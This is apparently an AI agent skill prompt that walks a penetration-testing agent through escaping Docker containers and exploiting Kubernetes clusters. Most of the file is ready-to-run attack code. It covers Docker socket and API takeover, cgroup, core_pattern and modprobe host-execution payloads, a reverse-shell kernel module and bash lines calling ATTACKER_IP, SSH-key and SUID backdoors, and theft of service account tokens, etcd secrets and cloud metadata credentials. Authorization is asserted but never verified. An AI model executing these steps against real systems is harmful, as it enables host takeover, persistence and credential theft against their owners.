---
name: container-escapes
description: >
  Container escape, Docker breakout, and Kubernetes exploitation.
keywords:
  - container escape
  - docker breakout
  - escape this container
  - I'm in a container
  - kubernetes exploitation
  - pod escape
  - privileged container
  - docker socket
  - docker desktop
  - WSL2 container
  - k8s pentest
  - service account token
  - kubelet
  - etcd
  - container enumeration
  - am I in a container
  - cgroup escape
  - nsenter
  - hostPID
  - hostNetwork
  - cap_sys_admin container
tools:
  - kubectl
  - crictl
  - ctr
  - CDK
  - deepce
  - amicontained
  - linpeas
  - curl (for API interaction)
  - nsenter
opsec: medium
---

# Container Escapes and Kubernetes Exploitation

You are helping a penetration tester escape from a containerized environment or
exploit a Kubernetes cluster. All testing is under explicit written authorization.

## Engagement Logging

Check for `./engagement/` directory. If absent, proceed without logging.

When an engagement directory exists:
- Print `[container-escapes] Activated → <target>` to the screen on activation.
- **Evidence** → save significant output to `engagement/evidence/` with
  descriptive filenames (e.g., `sqli-users-dump.txt`, `ssrf-aws-creds.json`).

## State Management

Call `get_state_summary()` from the state-reader MCP server to read current
engagement state. Use it to:
- Skip re-testing targets, parameters, or vulns already confirmed
- Leverage existing credentials or access for this technique
- Understand what's been tried and failed (check Blocked section)

Your return summary must include:
- New targets/hosts discovered (with ports and services)
- New credentials or tokens found
- Access gained or changed (user, privilege level, method)
- Vulnerabilities confirmed (with status and severity)
- Pivot paths identified (what leads where)
- Blocked items (what failed and why, whether retryable)

## Prerequisites

- Shell access inside a container (Docker, Kubernetes pod, LXC, Podman)
- OR network access to Docker API (2375/2376), Kubernetes API (6443/8443),
  kubelet (10250/10255), or etcd (2379)

## Step 1: Container Detection and Enumeration

First, confirm you're in a container and identify the type and security posture.

### Am I in a Container?

```bash
# Quick checks
ls -la /.dockerenv 2>/dev/null && echo "DOCKER CONTAINER"
ls -la /run/.containerenv 2>/dev/null && echo "PODMAN CONTAINER"
cat /proc/1/cgroup 2>/dev/null | grep -qiE "docker|containerd|kubepods|lxc|podman" && echo "CONTAINERIZED"

# Kubernetes pod detection
ls /var/run/secrets/kubernetes.io/serviceaccount/ 2>/dev/null && echo "KUBERNETES POD"
env | grep -q KUBERNETES && echo "KUBERNETES POD"

# Docker Desktop / WSL2 detection — narrows escape vectors significantly
uname -r | grep -q "microsoft-standard-WSL2" && echo "DOCKER DESKTOP (WSL2 backend)"

# Container runtime detection
cat /proc/1/cgroup 2>/dev/null | head -5
cat /proc/self/mountinfo 2>/dev/null | head -20
```

### Capability Check

Capabilities determine which escape techniques are available.

```bash
# Current capabilities
capsh --print 2>/dev/null
cat /proc/self/status | grep -i cap 2>/dev/null

# Decode capability bitmask
# CapEff: 0000003fffffffff = ALL capabilities (privileged)
# CapEff: 00000000a80425fb = Default Docker capabilities

# Quick privileged check — these only exist in privileged containers
test -e /dev/kmsg && echo "LIKELY PRIVILEGED"
test -w /proc/sys/kernel/core_pattern && echo "PRIVILEGED — /proc writable"
fdisk -l 2>/dev/null | head -5 && echo "DEVICE ACCESS — PRIVILEGED"
mount | grep -q "sysfs.*rw" && echo "SYSFS WRITABLE — PRIVILEGED"
```

**Key capabilities for escape:**

| Capability | Escape Technique |
|-----------|-----------------|
| `cap_sys_admin` | Mount host fs, cgroup release_agent, BPF |
| `cap_sys_ptrace` | Process injection, /proc/[pid]/mem write |
| `cap_sys_module` | Load kernel module (rootkit/reverse shell) |
| `cap_dac_override` | Read/write any file |
| `cap_dac_read_search` | Read any file (Shocker exploit) |
| `cap_sys_rawio` | Raw I/O (/dev/mem, /dev/kmem) |
| `cap_net_admin` | Network manipulation, ARP spoof |
| `cap_net_raw` | Packet sniffing, raw sockets |

### Environment Enumeration

```bash
# Current user and permissions
id
whoami

# Container ID
hostname  # Often the container ID
cat /proc/self/cgroup | grep -oP '[a-f0-9]{64}' | head -1

# Mounted filesystems (look for host mounts)
mount | grep -vE "^(proc|tmpfs|devpts|sysfs|cgroup)"
cat /proc/self/mountinfo | grep -vE "proc|tmpfs|devpts|sysfs|cgroup"

# Look for Docker socket
ls -la /var/run/docker.sock 2>/dev/null
ls -la /run/docker.sock 2>/dev/null
ls -la /var/run/containerd/containerd.sock 2>/dev/null
ls -la /run/containerd/containerd.sock 2>/dev/null
ls -la /var/run/crio/crio.sock 2>/dev/null

# Environment variables (credentials, configs)
env | sort

# Kubernetes-specific
cat /var/run/secrets/kubernetes.io/serviceaccount/token 2>/dev/null
cat /var/run/secrets/kubernetes.io/serviceaccount/namespace 2>/dev/null
echo "K8S API: $KUBERNETES_SERVICE_HOST:$KUBERNETES_SERVICE_PORT"

# Network info
ip addr 2>/dev/null || ifconfig 2>/dev/null
ip route 2>/dev/null || route -n 2>/dev/null
cat /etc/resolv.conf
cat /etc/hosts

# Secrets and credentials on disk
find / -name "*.key" -o -name "*.pem" -o -name "*.cert" -o -name "*token*" \
  -o -name "*secret*" -o -name "*.env" -o -name "config.json" 2>/dev/null | \
  grep -v proc | grep -v sys | head -20
```

### Automated Enumeration Tools

```bash
# deepce — Docker Enumeration, Escalation, Container Escapes
./deepce.sh
# Or from memory:
curl -sL https://github.com/stealthcopter/deepce/raw/main/deepce.sh | bash

# CDK — Container penetration toolkit
./cdk evaluate

# amicontained — Container introspection
./amicontained

# LinPEAS (container-aware)
./linpeas.sh
```

Present all findings and ask which escape vector to pursue.

## Step 2: Docker Socket Escape

**Prerequisite:** Docker socket mounted inside the container (`/var/run/docker.sock`).
This is the most reliable escape — if the socket is available, you have full
Docker API access which means full host control.

### Via Docker CLI

```bash
# Check if docker CLI is available inside the container
docker ps 2>/dev/null

# Create a new container that mounts the host filesystem
docker run -it -v /:/host --privileged ubuntu chroot /host bash

# Or use nsenter for host-level access
docker run -it --rm --pid=host --privileged ubuntu nsenter -t 1 -m -u -i -n -p bash

# If you just need to read files
docker run --rm -v /:/host ubuntu cat /host/etc/shadow
```

### Via curl (No Docker CLI)

```bash
# List containers
curl -s --unix-socket /var/run/docker.sock http://localhost/containers/json | python3 -m json.tool

# List images
curl -s --unix-socket /var/run/docker.sock http://localhost/images/json | python3 -m json.tool

# Create privileged container with host mount
curl -s --unix-socket /var/run/docker.sock -X POST \
  -H "Content-Type: application/json" \
  http://localhost/containers/create?name=pwn \
  -d '{
    "Image": "alpine",
    "Cmd": ["/bin/sh"],
    "Tty": true,
    "OpenStdin": true,
    "Mounts": [{
      "Type": "bind",
      "Source": "/",
      "Target": "/host"
    }],
    "HostConfig": {
      "Privileged": true,
      "PidMode": "host"
    }
  }'

# Start the container (use the ID from create response)
curl -s --unix-socket /var/run/docker.sock -X POST \
  http://localhost/containers/pwn/start

# Exec into the container
curl -s --unix-socket /var/run/docker.sock -X POST \
  -H "Content-Type: application/json" \
  http://localhost/containers/pwn/exec \
  -d '{
    "Cmd": ["nsenter", "-t", "1", "-m", "-u", "-i", "-n", "-p", "bash"],
    "AttachStdin": true,
    "AttachStdout": true,
    "AttachStderr": true,
    "Tty": true
  }'
```

### Via Containerd Socket

```bash
# If containerd socket is available
ctr --address /run/containerd/containerd.sock image list
ctr --address /run/containerd/containerd.sock run \
  --mount type=bind,src=/,dst=/host,options=rbind \
  -t --privileged docker.io/library/alpine:latest pwn /bin/sh
```

**After escaping via socket:** You have full root on the host. Route to
**linux-discovery** for further post-exploitation, or **network-recon** to
discover additional targets from the host's network position.

## Step 3: Privileged Container Escape

**Prerequisite:** Container running with `--privileged` flag or all capabilities.

### Method 1: Mount Host Filesystem

```bash
# List host block devices
fdisk -l 2>/dev/null | grep "^Disk /dev/"
lsblk 2>/dev/null

# Mount host root filesystem
mkdir -p /mnt/host
mount /dev/sda1 /mnt/host    # Common for VMs
# Or: mount /dev/vda1 /mnt/host  (for virtio/cloud)
# Or: mount /dev/xvda1 /mnt/host (for AWS EC2)

# Access host filesystem
ls /mnt/host/
cat /mnt/host/etc/shadow
chroot /mnt/host bash

# Add SSH key for persistent access
mkdir -p /mnt/host/root/.ssh
echo "ssh-ed25519 AAAA... attacker@host" >> /mnt/host/root/.ssh/authorized_keys
chmod 600 /mnt/host/root/.ssh/authorized_keys

# Create SUID bash for quick re-entry
cp /mnt/host/bin/bash /mnt/host/tmp/.backdoor
chmod u+s /mnt/host/tmp/.backdoor
# On host: /tmp/.backdoor -p
```

### Method 2: nsenter to Host Namespaces

```bash
# Enter all host namespaces via PID 1 (init)
nsenter -t 1 -m -u -i -n -p bash

# Or selectively:
nsenter -t 1 -m bash    # Mount namespace only (see host filesystem)
nsenter -t 1 -n bash    # Network namespace only (see host network)
nsenter -t 1 -p bash    # PID namespace only (see host processes)
```

Requires `--pid=host` or the host PID namespace to be shared.

### Method 3: cgroup release_agent

Works when `cap_sys_admin` is available (even without `--privileged` in some configs).

```bash
# Classic release_agent escape
# Find writable cgroup
d=$(dirname $(ls -x /s*/fs/c*/*/r* 2>/dev/null | head -n1) 2>/dev/null)
if [ -z "$d" ]; then
  # Mount cgroup ourselves
  mkdir /tmp/cgrp
  mount -t cgroup -o rdma cgroup /tmp/cgrp 2>/dev/null || \
  mount -t cgroup -o memory cgroup /tmp/cgrp 2>/dev/null
  d=/tmp/cgrp
fi

# Create child cgroup and configure release_agent
mkdir -p $d/x
echo 1 > $d/x/notify_on_release

# Find container path on host filesystem
t=$(sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab)

# Set release_agent to our script
echo "$t/cmd" > $d/release_agent

# Write escape payload
cat > /cmd <<'ESCAPE'
#!/bin/sh
# Runs on HOST as root when cgroup empties
ps aux > /tmp/host_ps.txt
cat /etc/shadow > /tmp/host_shadow.txt
# Reverse shell variant:
# bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'
ESCAPE
chmod +x /cmd

# Trigger: put a process in the cgroup, then let it exit
sh -c "echo \$\$ > $d/x/cgroup.procs"

# Check output (written to container path visible from host)
sleep 1
cat /tmp/host_ps.txt 2>/dev/null
cat /tmp/host_shadow.txt 2>/dev/null
```

**CVE-2022-0492 variant** (kernel < 5.16.2): Bypasses kernel privilege checks
that normally prevent non-init user namespaces from setting release_agent.

### Method 4: Kernel Module Loading

```bash
# Compile a reverse shell kernel module (on attacker machine, match target kernel)
cat > /tmp/reverse_shell.c <<'EOF'
#include <linux/module.h>
#include <linux/kmod.h>

MODULE_LICENSE("GPL");

static int __init reverse_shell_init(void) {
    char *argv[] = {"/bin/bash", "-c",
        "bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1", NULL};
    char *envp[] = {"HOME=/root", "PATH=/usr/bin:/bin", NULL};
    call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC);
    return 0;
}

static void __exit reverse_shell_exit(void) {}

module_init(reverse_shell_init);
module_exit(reverse_shell_exit);
EOF

# Build against target kernel headers
make -C /lib/modules/$(uname -r)/build M=/tmp modules

# Load module (executes on HOST kernel)
insmod /tmp/reverse_shell.ko
```

**OPSEC: HIGH** — Kernel modules are persistent, visible in `lsmod`, and logged.
Use only in lab/CTF environments.

## Step 4: Sensitive Mount Exploitation

Escape without `--privileged` by abusing specific mounted paths.

### /proc/sys/kernel/core_pattern

If `/proc/sys/kernel/core_pattern` is writable:

```bash
# Check if writable
test -w /proc/sys/kernel/core_pattern && echo "WRITABLE"

# Write pipe command (executes on HOST when a core dump is triggered)
echo "|/path/on/host/to/payload" > /proc/sys/kernel/core_pattern

# Container overlay path (find it via mountinfo)
t=$(sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab)
echo "|$t/payload.sh" > /proc/sys/kernel/core_pattern

# Create payload
cat > /payload.sh <<'EOF'
#!/bin/bash
bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1
EOF
chmod +x /payload.sh

# Trigger a core dump
ulimit -c unlimited
sleep 100 &
kill -SIGSEGV $!
```

### /sys/kernel/uevent_helper

```bash
# If writable
test -w /sys/kernel/uevent_helper && echo "WRITABLE"

t=$(sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab)
echo "$t/payload.sh" > /sys/kernel/uevent_helper

# Trigger uevent
echo change > /sys/class/mem/null/uevent
```

### /proc/sys/kernel/modprobe

```bash
# If writable — runs as root on host when an unknown binary format is executed
test -w /proc/sys/kernel/modprobe && echo "WRITABLE"

t=$(sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab)
echo "$t/payload.sh" > /proc/sys/kernel/modprobe

# Create payload
echo -e '#!/bin/sh\nbash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1' > /payload.sh
chmod +x /payload.sh

# Trigger unknown binary format
echo -ne '\xff\xff\xff\xff' > /tmp/trigger
chmod +x /tmp/trigger
/tmp/trigger 2>/dev/null
```

### Host Filesystem Volume Mounts

If any host paths are mounted inside the container:

```bash
# Identify host mounts
mount | grep -vE "^(proc|tmpfs|devpts|sysfs|cgroup|overlay)"
cat /proc/self/mountinfo | grep -v "per-container"

# Common writable host mounts to look for:
# /var/log — write cron job or logrotate script
# /var/run — access sockets
# /etc — modify host config
# /opt, /srv — application directories
# /tmp — place SUID binary if host has predictable cron

# If /etc is mounted writable
echo "attacker:$(openssl passwd -6 password):0:0::/root:/bin/bash" >> /host-etc/passwd

# If /var/run is mounted — check for sockets
ls -la /host-var-run/*.sock 2>/dev/null
```

## Step 5: Capability-Specific Escapes

When the container has specific capabilities but isn't fully privileged.

### CAP_SYS_PTRACE — Process Injection

```bash
# Find a root-owned process on the host (requires --pid=host)
ps aux | grep root | head -10

# Inject shellcode into a host process
# Using linux-inject or manual /proc/[pid]/mem write
python3 -c "
import ctypes
import struct

# Attach to target process
pid = 1  # init
mem = open(f'/proc/{pid}/mem', 'wb')
maps = open(f'/proc/{pid}/maps', 'r')

# Find executable region and inject
for line in maps:
    if 'r-xp' in line:
        addr = int(line.split('-')[0], 16)
        # Write shellcode at this address
        mem.seek(addr)
        # ... shellcode injection
        break
"
```

### CAP_DAC_READ_SEARCH — Shocker Exploit

Read any file on the host filesystem:

```bash
# Shocker exploit (uses open_by_handle_at syscall)
# Compile and run:
# https://github.com/gabber12/shocker/blob/master/shocker.c
./shocker /etc/shadow
```

### CAP_SYS_MODULE — Kernel Module

See Step 3, Method 4 (Kernel Module Loading).

### CAP_NET_ADMIN + CAP_NET_RAW — Network Attacks

```bash
# ARP spoofing to intercept traffic
# Useful when container shares network with other services
arpspoof -i eth0 -t GATEWAY_IP TARGET_IP

# Packet capture
tcpdump -i eth0 -w capture.pcap

# Route manipulation
ip route add 169.254.169.254 via ATTACKER_IP  # Redirect metadata service
```

## Step 6: Remote Docker API Exploitation

**Prerequisite:** Network access to Docker API on port 2375 (HTTP) or 2376 (HTTPS).
Typically found via **network-recon** during service enumeration.

```bash
# Check for open Docker API
curl -s http://TARGET:2375/version | python3 -m json.tool
curl -s http://TARGET:2375/containers/json | python3 -m json.tool

# List images
curl -s http://TARGET:2375/images/json | python3 -m json.tool

# Create and start a privileged container
curl -s -X POST -H "Content-Type: application/json" \
  http://TARGET:2375/containers/create \
  -d '{
    "Image": "alpine",
    "Cmd": ["sh", "-c", "echo pwned > /host/tmp/pwned && cat /host/etc/shadow"],
    "Mounts": [{"Type":"bind","Source":"/","Target":"/host"}],
    "HostConfig": {"Privileged": true}
  }'

# Start it (replace CONTAINER_ID)
curl -s -X POST http://TARGET:2375/containers/CONTAINER_ID/start

# Get output
curl -s http://TARGET:2375/containers/CONTAINER_ID/logs?stdout=true

# Or use docker CLI remotely
export DOCKER_HOST=tcp://TARGET:2375
docker ps
docker run -it -v /:/host --privileged alpine chroot /host bash
```

## Step 6b: Docker Desktop Internal API Escape

**Prerequisite:** Container running on Docker Desktop (Windows or macOS host).
Detected by `uname -r` containing `microsoft-standard-WSL2` (Windows) or
other Docker Desktop kernel indicators.

Docker Desktop runs containers inside a lightweight VM with an internal
management network. The Docker Engine API may be exposed on this internal
subnet without authentication — accessible from any container, even
unprivileged ones without a mounted Docker socket.

### Detection

```bash
# Confirm Docker Desktop environment
uname -r | grep -qi "microsoft-standard-WSL2" && echo "WSL2 — Docker Desktop likely"

# Check for Docker Desktop internal management subnet
# The VM typically uses 192.168.65.0/24 for host↔VM communication
ip route 2>/dev/null | grep "192.168.65"

# Scan for unauthenticated Docker API on the internal subnet
# Common addresses: 192.168.65.3, 192.168.65.7
for ip in 192.168.65.3 192.168.65.4 192.168.65.5 192.168.65.6 192.168.65.7; do
  curl -s --connect-timeout 2 "http://$ip:2375/_ping" 2>/dev/null && \
    echo "DOCKER API FOUND: $ip:2375"
done

# If no hit on known IPs, broader sweep
for i in $(seq 1 20); do
  curl -s --connect-timeout 1 "http://192.168.65.$i:2375/_ping" 2>/dev/null && \
    echo "DOCKER API FOUND: 192.168.65.$i:2375"
done
```

### Exploitation

Once the API is found, exploitation is identical to Step 6 (Remote Docker API)
but via the internal subnet address instead of an external IP:

```bash
DOCKER_API="http://192.168.65.7:2375"  # Replace with discovered IP

# Verify API access
curl -s "$DOCKER_API/version" | python3 -m json.tool

# List available images (use an existing one — no internet pull needed)
curl -s "$DOCKER_API/images/json" | python3 -c "
import sys,json
for img in json.load(sys.stdin):
    tags = img.get('RepoTags') or ['<none>']
    print(tags[0])
"

# Create container with host filesystem mount
# Docker Desktop maps the host filesystem under /mnt/host/ inside the VM:
#   Windows: /mnt/host/c/ = C:\
#   macOS: /mnt/host/Users/ = /Users/
IMAGE="alpine"  # Use an image from the list above
curl -s -X POST -H "Content-Type: application/json" \
  "$DOCKER_API/containers/create?name=escape" \
  -d '{
    "Image": "'$IMAGE'",
    "Cmd": ["sleep", "3600"],
    "Mounts": [{
      "Type": "bind",
      "Source": "/",
      "Target": "/host"
    }],
    "HostConfig": {"Privileged": true}
  }'

# Start the container
curl -s -X POST "$DOCKER_API/containers/escape/start"

# Read files from the host via exec
# Windows host files: /host/mnt/host/c/Users/...
# macOS host files: /host/mnt/host/Users/...
# VM root files: /host/etc/shadow, /host/root/...
EXEC_ID=$(curl -s -X POST -H "Content-Type: application/json" \
  "$DOCKER_API/containers/escape/exec" \
  -d '{"Cmd":["cat","/host/mnt/host/c/Users/Administrator/Desktop/root.txt"],"AttachStdout":true}' | \
  python3 -c "import sys,json; print(json.load(sys.stdin)['Id'])")
curl -s -X POST -H "Content-Type: application/json" \
  "$DOCKER_API/exec/$EXEC_ID/start" -d '{"Detach":false}'

# Cleanup
curl -s -X POST "$DOCKER_API/containers/escape/stop"
curl -s -X DELETE "$DOCKER_API/containers/escape"
```

**Key differences from standard remote Docker API (Step 6):**
- No Docker socket mount needed — exploitable from unprivileged containers
- Host filesystem is at `/mnt/host/` inside the VM, not at `/` directly
- Windows: `C:\` maps to `/mnt/host/c/`, `D:\` to `/mnt/host/d/`
- macOS: `/Users/` maps to `/mnt/host/Users/`
- The API is on an internal subnet — not externally reachable

**After escaping:** You have access to the host filesystem (Windows or macOS)
through the VM's mount points. Read flags, credentials, SSH keys, or establish
persistence. Route to host-level discovery for further post-exploitation.

## Step 7: Kubernetes — Service Account Token Exploitation

**Prerequisite:** Inside a Kubernetes pod with a service account token mounted.

### Token Discovery and API Access

```bash
# Default token location
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
NAMESPACE=$(cat /var/run/secrets/kubernetes.io/serviceaccount/namespace)
CACERT=/var/run/secrets/kubernetes.io/serviceaccount/ca.crt
APISERVER="https://${KUBERNETES_SERVICE_HOST}:${KUBERNETES_SERVICE_PORT}"

# Test API access
curl -sk -H "Authorization: Bearer $TOKEN" $APISERVER/api/v1/

# Check permissions (what can this SA do?)
curl -sk -H "Authorization: Bearer $TOKEN" \
  -X POST -H "Content-Type: application/json" \
  $APISERVER/apis/authorization.k8s.io/v1/selfsubjectrulesreviews \
  -d '{"apiVersion":"authorization.k8s.io/v1","kind":"SelfSubjectRulesReview","spec":{"namespace":"'$NAMESPACE'"}}'

# Or with kubectl if available
kubectl --token=$TOKEN --server=$APISERVER --insecure-skip-tls-verify auth can-i --list
```

### Enumerate Secrets

```bash
# List secrets in current namespace
curl -sk -H "Authorization: Bearer $TOKEN" \
  $APISERVER/api/v1/namespaces/$NAMESPACE/secrets

# List secrets in all namespaces (requires cluster-wide read)
curl -sk -H "Authorization: Bearer $TOKEN" \
  $APISERVER/api/v1/secrets

# Get a specific secret
curl -sk -H "Authorization: Bearer $TOKEN" \
  $APISERVER/api/v1/namespaces/$NAMESPACE/secrets/SECRET_NAME

# Decode secret values (base64)
curl -sk -H "Authorization: Bearer $TOKEN" \
  $APISERVER/api/v1/namespaces/$NAMESPACE/secrets/SECRET_NAME | \
  python3 -c "import sys,json,base64; d=json.load(sys.stdin)['data']; [print(f'{k}: {base64.b64decode(v).decode()}') for k,v in d.items()]"
```

### List and Inspect Pods

```bash
# List pods in namespace
curl -sk -H "Authorization: Bearer $TOKEN" \
  $APISERVER/api/v1/namespaces/$NAMESPACE/pods

# List all pods (cluster-wide)
curl -sk -H "Authorization: Bearer $TOKEN" \
  $APISERVER/api/v1/pods

# Get pod details (check for privileged, hostPID, volumes)
curl -sk -H "Authorization: Bearer $TOKEN" \
  $APISERVER/api/v1/namespaces/$NAMESPACE/pods/POD_NAME | \
  python3 -c "
import sys,json
pod=json.load(sys.stdin)
spec=pod['spec']
for c in spec.get('containers',[]):
    sc=c.get('securityContext',{})
    print(f\"{c['name']}: privileged={sc.get('privileged')}, caps={sc.get('capabilities',{}).get('add',[])}\")
print(f\"hostPID={spec.get('hostPID')}, hostNetwork={spec.get('hostNetwork')}, hostIPC={spec.get('hostIPC')}\")
for v in spec.get('volumes',[]):
    if 'hostPath' in v: print(f\"hostPath: {v['hostPath']['path']} as {v['name']}\")
"
```

### Create Malicious Pod

If the SA has pod creation permissions:

```bash
# Create a privileged pod that mounts the host filesystem
cat <<'EOF' | curl -sk -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -X POST $APISERVER/api/v1/namespaces/$NAMESPACE/pods -d @-
{
  "apiVersion": "v1",
  "kind": "Pod",
  "metadata": {
    "name": "pwn"
  },
  "spec": {
    "containers": [{
      "name": "pwn",
      "image": "alpine",
      "command": ["/bin/sh", "-c", "sleep 3600"],
      "securityContext": {
        "privileged": true
      },
      "volumeMounts": [{
        "name": "hostfs",
        "mountPath": "/host"
      }]
    }],
    "volumes": [{
      "name": "hostfs",
      "hostPath": {
        "path": "/",
        "type": "Directory"
      }
    }],
    "hostPID": true,
    "hostNetwork": true
  }
}
EOF

# Exec into the malicious pod
curl -sk -H "Authorization: Bearer $TOKEN" \
  -X POST "$APISERVER/api/v1/namespaces/$NAMESPACE/pods/pwn/exec?command=/bin/sh&stdin=true&stdout=true&tty=true" \
  -H "Upgrade: websocket" -H "Connection: Upgrade"

# Or with kubectl
kubectl --token=$TOKEN --server=$APISERVER --insecure-skip-tls-verify \
  exec -it pwn -- nsenter -t 1 -m -u -i -n -p bash
```

**BadPods reference** (BishopFox): Pre-built malicious pod manifests for
8 different escape scenarios — useful for systematic testing.

## Step 8: Kubernetes — Kubelet API Exploitation

**Prerequisite:** Network access to kubelet on port 10250 (authenticated) or
10255 (read-only, deprecated).

```bash
# Check if kubelet is accessible
curl -sk https://NODE_IP:10250/pods

# Read-only port (if enabled)
curl -s http://NODE_IP:10255/pods

# List pods on this node
curl -sk https://NODE_IP:10250/pods | python3 -c "
import sys,json
pods=json.load(sys.stdin)['items']
for p in pods:
  ns=p['metadata']['namespace']
  name=p['metadata']['name']
  for c in p['spec']['containers']:
    print(f'{ns}/{name}/{c[\"name\"]}')"

# Execute command in a pod via kubelet
curl -sk https://NODE_IP:10250/run/NAMESPACE/POD_NAME/CONTAINER_NAME \
  -d "cmd=id"

# Interactive shell
curl -sk "https://NODE_IP:10250/exec/NAMESPACE/POD_NAME/CONTAINER_NAME?command=/bin/sh&input=1&output=1&tty=1" \
  -H "Upgrade: SPDY/3.1" -H "Connection: Upgrade"
```

**If kubelet allows anonymous access**, you can exec into any pod on that node,
including pods with elevated privileges or mounted secrets.

## Step 9: Kubernetes — etcd Secret Extraction

**Prerequisite:** Network access to etcd on port 2379. etcd stores all Kubernetes
cluster state, including secrets in plaintext (unless encryption-at-rest is enabled).

```bash
# Check etcd access
curl -k https://ETCD_IP:2379/version
curl -k https://ETCD_IP:2379/health

# List all keys
etcdctl --endpoints=http://ETCD_IP:2379 get / --prefix --keys-only 2>/dev/null

# If TLS required (find certs on master node)
etcdctl --endpoints=https://ETCD_IP:2379 \
  --cacert=/etc/kubernetes/pki/etcd/ca.crt \
  --cert=/etc/kubernetes/pki/etcd/server.crt \
  --key=/etc/kubernetes/pki/etcd/server.key \
  get / --prefix --keys-only

# Extract all secrets
etcdctl --endpoints=http://ETCD_IP:2379 get /registry/secrets --prefix

# Extract specific secret
etcdctl --endpoints=http://ETCD_IP:2379 get /registry/secrets/NAMESPACE/SECRET_NAME

# Without etcdctl — use curl
curl -s http://ETCD_IP:2379/v3/kv/range \
  -d '{"key":"L3JlZ2lzdHJ5L3NlY3JldHMv","range_end":"L3JlZ2lzdHJ5L3NlY3JldHMw"}' | \
  python3 -c "import sys,json,base64; r=json.load(sys.stdin); [print(base64.b64decode(kv['value'])) for kv in r.get('kvs',[])]"
```

## Step 10: Kubernetes — RBAC Exploitation

Common RBAC misconfigurations that allow privilege escalation.

### Wildcard Permissions

```bash
# Check for wildcard ClusterRoleBindings
kubectl --token=$TOKEN --server=$APISERVER --insecure-skip-tls-verify \
  get clusterrolebindings -o json | python3 -c "
import sys,json
data=json.load(sys.stdin)
for item in data['items']:
  for sub in item.get('subjects',[]):
    print(f\"{item['metadata']['name']} -> {sub.get('name')} ({sub.get('kind')})\")
"
```

### Service Account Impersonation

If SA has `impersonate` verb:

```bash
# Impersonate a more privileged SA
curl -sk -H "Authorization: Bearer $TOKEN" \
  -H "Impersonate-User: system:serviceaccount:kube-system:default" \
  $APISERVER/api/v1/secrets
```

### RoleBinding Escalation

If SA can create/modify RoleBindings:

```bash
# Bind cluster-admin to your service account
cat <<EOF | curl -sk -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -X POST $APISERVER/apis/rbac.authorization.k8s.io/v1/namespaces/$NAMESPACE/rolebindings -d @-
{
  "apiVersion": "rbac.authorization.k8s.io/v1",
  "kind": "RoleBinding",
  "metadata": {"name": "pwn-binding"},
  "roleRef": {
    "apiGroup": "rbac.authorization.k8s.io",
    "kind": "ClusterRole",
    "name": "cluster-admin"
  },
  "subjects": [{
    "kind": "ServiceAccount",
    "name": "default",
    "namespace": "'$NAMESPACE'"
  }]
}
EOF
```

## Step 11: Container CVEs

### CVE-2019-5736 — runc Container Escape

Overwrites the host runc binary when `docker exec` is used. Affects runc < 1.0-rc6.

```bash
# Check runc version (from host or via /proc)
runc --version 2>/dev/null

# Exploit: replace /bin/sh in container so docker exec triggers overwrite
# Use: https://github.com/Frichetten/CVE-2019-5736-PoC
# 1. Compile payload targeting runc on host
# 2. Replace /bin/sh in container with exploit binary
# 3. Wait for docker exec (or trigger it)
# 4. runc on host is overwritten with your payload
```

### CVE-2022-0492 — cgroup release_agent (Unprivileged)

Kernel < 5.16.2. See Step 3, Method 3 (already covered in release_agent section).

### CVE-2024-21626 — runc "Leaky Vessels"

runc < 1.1.12. Leaked file descriptor allows container escape during `docker build`
or `docker exec`.

```bash
# Check runc version
runc --version 2>/dev/null

# Exploit: use leaked /proc/self/fd/[N] pointing to host root
# During container start, if WORKDIR is set to /proc/self/fd/N
# the container process inherits an FD to the host filesystem
```

### CVE-2024-1753 — Buildah/Podman Build Escape

Podman < 4.9.2, Buildah < 1.34.2. Bind mount breakout during build.

### CVE-2025-31133 — runc maskedPaths Race

runc <= 1.2.7. Race condition in `/dev/null` masking allows writing to
`/proc/sys/kernel/core_pattern` without leaving PID namespace.

## Step 12: Cloud Metadata from Containers

If the container has network access (especially with `hostNetwork`), cloud
metadata services may be reachable.

```bash
# AWS IMDSv1 (no authentication)
curl -s http://169.254.169.254/latest/meta-data/
curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/
curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE_NAME

# AWS IMDSv2 (requires token)
TOKEN=$(curl -s -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")
curl -s -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/meta-data/iam/security-credentials/

# GCP
curl -s -H "Metadata-Flavor: Google" http://metadata.google.internal/computeMetadata/v1/
curl -s -H "Metadata-Flavor: Google" http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token

# Azure
curl -s -H "Metadata: true" "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/"
curl -s -H "Metadata: true" "http://169.254.169.254/metadata/instance?api-version=2021-02-01"

# EKS IRSA token (AWS IAM Roles for Service Accounts)
cat /var/run/secrets/eks.amazonaws.com/serviceaccount/token 2>/dev/null
```

## Step 13: Routing Decision Tree

### Escaped to Host

Successfully accessed host filesystem or got a host shell.

### Found K8s Cluster Admin

Service account has cluster-admin or equivalent permissions.
→ Enumerate all secrets (database creds, cloud tokens, service accounts)
→ Access other pods/nodes
→ **Route to credential-dumping** if AD credentials found in secrets

### Found Cloud Credentials

Metadata service returned IAM role credentials or managed identity tokens.
→ Use AWS CLI / az CLI / gcloud with stolen credentials
→ Check for S3 buckets, blob storage, key vaults
→ Cloud privesc is in **backlog** — perform manual assessment

### Multiple Containers / Pods on Same Network

Discovered other containers or Kubernetes services.
→ **Route to network-recon** to scan the container network
→ Check for inter-pod communication, internal APIs, databases

### No Escape Vector Found

Container is properly hardened (no caps, no mounts, read-only rootfs).
→ Check for Docker Desktop internal API (Step 6b) — works even without caps/mounts
→ Look for application-level vulns inside the container
→ Check for network access to other services (databases, internal APIs)
→ Check cloud metadata access (Step 12)
